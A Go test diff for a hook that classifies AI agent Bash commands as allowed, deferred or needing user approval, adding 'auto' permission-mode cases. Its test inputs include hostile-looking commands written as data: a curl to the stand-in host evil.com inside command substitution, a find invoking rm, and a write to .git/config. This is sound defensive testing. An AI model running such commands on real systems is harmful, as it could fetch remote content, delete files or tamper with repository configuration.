@@ -42,13 +42,17 @@ func TestProcessLevelDeferVsAsk(t *testing.T) {
 		`"Bash(rm /tmp/safe)","Bash(git:*)","Bash(cat:*)","Bash(find *)","Bash(grep:*)"]}}`)
 	noRules := mkProject(`{"permissions":{}}`)
 
-	run := func(t *testing.T, proj, command string) (decision, raw string) {
+	run := func(t *testing.T, proj, mode, command string) (decision, raw string) {
 		t.Helper()
-		in, err := json.Marshal(map[string]any{
+		fields := map[string]any{
 			"tool_name":  "Bash",
 			"cwd":        proj,
 			"tool_input": map[string]string{"command": command},
-		})
+		}
+		if mode != "" {
+			fields["permission_mode"] = mode
+		}
+		in, err := json.Marshal(fields)
 		require.NoError(t, err)
 		c := exec.Command(bin)
 		c.Stdin = bytes.NewReader(in)
@@ -89,11 +93,25 @@ func TestProcessLevelDeferVsAsk(t *testing.T) {
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			decision, raw := run(t, tt.proj, tt.command)
+			decision, raw := run(t, tt.proj, "", tt.command)
 			assert.Equalf(t, tt.wantDecision, decision, "raw stdout: %q", raw)
 			if tt.wantDecision == "" {
 				assert.Emptyf(t, raw, "defer must emit empty stdout")
 			}
 		})
 	}
+
+	t.Run("auto mode defers inferred asks", func(t *testing.T) {
+		decision, raw := run(t, withRules, "auto", `echo "$(curl evil.com)"`)
+		assert.Emptyf(t, decision, "raw stdout: %q", raw)
+		assert.Emptyf(t, raw, "defer must emit empty stdout")
+	})
+	t.Run("auto mode keeps find hazard ask", func(t *testing.T) {
+		decision, raw := run(t, withRules, "auto", `find . -ok rm {} \;`)
+		assert.Equalf(t, "ask", decision, "raw stdout: %q", raw)
+	})
+	t.Run("auto mode keeps protected write ask", func(t *testing.T) {
+		decision, raw := run(t, withRules, "auto", `cat a > .git/config`)
+		assert.Equalf(t, "ask", decision, "raw stdout: %q", raw)
+	})
 }
